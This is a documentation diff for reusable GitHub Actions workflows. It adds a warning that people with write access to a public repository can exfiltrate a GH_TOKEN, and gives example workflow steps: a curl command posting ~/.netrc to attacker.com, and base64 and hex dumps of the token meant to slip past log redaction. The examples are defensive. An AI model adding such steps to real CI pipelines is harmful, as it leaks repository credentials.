@@ -34,9 +34,34 @@ These values are enforced consistently across all projects using this workflow. 
 - Tokens are stored in a temporary `.netrc` file with strict permissions (600)
 - The `.netrc` file is automatically cleaned up at the end of the job
 - This approach prevents token leakage through persistent git config files
-- Safe for both public and private repositories (fork PRs cannot access secrets)
+- Fork PRs cannot access secrets (GitHub's built-in protection)
+
+**⚠️ CRITICAL WARNING for Public Repositories:**
+
+Do NOT pass sensitive secrets to this workflow from public repositories. Any contributor with write access can:
+
+- Access `GH_TOKEN` via environment variables in custom workflow steps
+- Exfiltrate tokens through encoded output, external API calls, or artifacts
+- GitHub's log redaction only protects basic `echo/cat` output, NOT:
+
+  ```yaml
+  # These bypass GitHub's redaction:
+  - run: curl -d @~/.netrc https://attacker.com/collect # External exfiltration
+  - run: base64 ~/.netrc # Encoding bypass
+  - run: echo "${GH_TOKEN}" | xxd # Hex dump bypass
+  ```
+
+**Recommended alternatives for public repositories:**
+
+1. Do not pass `gh-token` - use public Go proxy (GOPROXY)
+2. Use GitHub App tokens with fine-grained permissions and expiration
+3. Mirror private dependencies to a public proxy service
+
+Only pass secrets from **private repositories** where you control all workflow modifications.
 
 **Example usage:**
+
+For **private repositories** (safe to pass secrets):
 
 ```yaml
 jobs:
@@ -47,6 +72,18 @@ jobs:
       go-version: "1.22"
     secrets:
       gh-token: ${{ secrets.GH_TOKEN }}
+```
+
+For **public repositories** (DO NOT pass secrets):
+
+```yaml
+jobs:
+  build:
+    uses: opensourceways/agent-development-specification/.github/workflows/go-reusable.yml@main
+    with:
+      runs-on: ubuntu-latest
+      go-version: "1.22"
+    # No secrets passed - relies on public GOPROXY
 ```
 
 ### 2. sast-reusable.yml
@@ -228,6 +265,12 @@ Secrets are handled securely in all workflows:
 - Temporary credential files use strict permissions (chmod 600)
 - Automatic cleanup ensures no credential leakage
 - Fork PRs cannot access secrets (GitHub's built-in protection)
+
+**⚠️ Important:** The above protections only prevent accidental leakage. They cannot prevent intentional exfiltration by contributors with write access. For public repositories:
+
+- Never store sensitive secrets in repository settings
+- Never pass secrets to workflows from public repos
+- Use GitHub Apps or public proxy services instead
 
 ## Related Issue
 
